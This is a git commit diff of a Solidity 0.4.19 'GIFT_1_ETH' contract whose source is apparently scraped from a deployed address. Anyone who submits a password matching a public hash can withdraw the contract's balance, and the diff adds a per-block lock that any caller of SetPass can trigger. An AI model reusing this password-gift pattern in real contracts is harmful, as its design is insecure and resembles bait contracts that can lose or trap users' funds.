92865325b78e89673f95cddc3a474c143de61e6a
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 17:20:47 +0700

    add contract GIFT_1_ETH

--- Gift_1_ETH.sol
+++ Gift_1_ETH.sol
@@ -1,19 +1,21 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT_1_ETH at 0x3597F78c7872DB259CE023aCc34511c7a79F42E3
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT_1_ETH at 0x6594ac0a2ba54885ff7d314eb27c9694cb25698b
 */
 pragma solidity ^0.4.19;
 
 contract GIFT_1_ETH
 {
-    bool passHasBeenSet = false;
+    bytes32 public hashPass;
     
     address sender;
-    
-    bytes32 public hashPass;
+	
+	bool passHasBeenSet = false;
+	
+	uint lastBlock;
 	
 	function() public payable{}
     
-    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
+    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}
     
     function SetPass(bytes32 hash)
     public
@@ -24,13 +26,15 @@ contract GIFT_1_ETH
             hashPass = hash;
             sender = msg.sender;
         }
+        lastBlock = block.number;
     }
     
     function GetGift(bytes pass)
     external
     payable
+    oneforblock
     {
-        if(hashPass == sha3(pass))
+        if(hashPass == keccak256(pass))
         {
             msg.sender.transfer(this.balance);
         }
@@ -39,6 +43,7 @@ contract GIFT_1_ETH
     function Revoce()
     public
     payable
+    oneforblock
     {
         if(msg.sender==sender)
         {
@@ -54,4 +59,11 @@ contract GIFT_1_ETH
            passHasBeenSet=true;
         }
     }
+    
+    modifier oneforblock
+    {
+        require(lastBlock<block.number);
+        _;
+    }
+    
 }
